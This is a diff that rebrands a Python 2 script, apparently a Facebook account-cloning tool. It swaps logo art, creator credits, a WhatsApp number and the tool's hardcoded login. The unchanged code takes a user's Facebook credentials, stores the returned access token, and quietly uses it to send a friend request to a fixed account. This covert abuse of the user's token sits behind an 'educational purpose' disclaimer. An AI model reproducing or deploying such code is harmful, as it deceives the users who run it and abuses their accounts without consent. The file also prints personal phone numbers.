@@ -51,18 +51,18 @@ def jalan(z):
 ##### INTRO #####
 logo ="""
 
-\x1b[1;96m░░░░░██╗░█████╗░███╗░░░███╗
-\x1b[1;96m░░░░░██║██╔══██╗████╗░████║
-\x1b[1;96m░░░░░██║███████║██╔████╔██║
-\x1b[1;96m██╗░░██║██╔══██║██║╚██╔╝██║
-\x1b[1;96m╚█████╔╝██║░░██║██║░╚═╝░██║
-\x1b[1;96m░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
+\x1b[1;96m⓹_____((()))_____❺_____((()))_____⓹
+\x1b[1;96m⓹_____((()))_____❺_____((()))_____⓹
+\x1b[1;96m⓹_____((()))_____❺_____((()))_____⓹
+\x1b[1;96m⓹_____((()))_____❺_____((()))_____⓹
+\x1b[1;96m⓹_____((()))_____❺_____((()))_____⓹
+\x1b[1;96mメ™︻╦╤──────────────™メ
 \x1b[1;97m--------------------------------------------------------------
-\x1b[1;94m➣  YouTube  : JAM SHAHRUKH TECHNICAL
-\x1b[1;94m➣  Facebook : JAM SHAHRUKH
+\x1b[1;94m➣  YouTube  : Htc Ctr Gaming
+\x1b[1;94m➣  Facebook : Faizul
 \x1b[1;94m➣  Note     : Dont ReEdit It 
-\x1b[1;94m➣  Github   : https://github.com/Jam302/King
-\x1b[1;94m➣  Whatsapp : +971528752764
+\x1b[1;94m➣  Github   : https://github.com/Faizulboften/clonFbold
+\x1b[1;94m➣  Whatsapp : +6282271426251
 \x1b[1;94m➣  Note     : Having Problem? Contact Me On Whatsapp.
 \x1b[1;94m➣  Disclamiar : This Is For Educational Purpose Only.
 \x1b[1;97m--------------------------------------------------------------"""
@@ -83,8 +83,8 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print logo
 
-CorrectUsername = "jam"
-CorrectPassword = "jam"
+CorrectUsername = "Faizul"
+CorrectPassword = "cyber"
 
 loop = 'true'
 while (loop == 'true'):
@@ -111,8 +111,8 @@ def login():
 		print logo
      	
 		
-		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mUse a New Account To Login' )
-		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97mJam King Of Facebook' ) 
+		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mUse a Login Akun Lu Cok' )
+		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97mFaizul Cyber Indonesia Facebook' ) 
 		
 		print('	' )
 		print('      \033[1;97m      ✧ \x1b[1;97mLogin With Facebook\x1b[1;97m ✧')
@@ -120,7 +120,7 @@ def login():
 		id = raw_input('\033[1;97m✧ \x1b[1;97mID/Email\x1b[1;97m: \x1b[1;97m')
 		pwd = raw_input('\033[1;97m✧ \x1b[1;97mPassword\x1b[1;97m: \x1b[1;97m')
 		try:
-			br.open('https://m.facebook.com')
+			br.open('https://free.facebook.com')
 		except mechanize.URLError:
 			print"\n\x1b[1;97mThere is no internet connection"
 			keluar()
@@ -145,7 +145,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;97mSuccessfully Logged In'
-				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+				os.system('xdg-open https://www.youtube.com/channel/UCSxkYGsMV5DvXz4GQJskl9Q')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
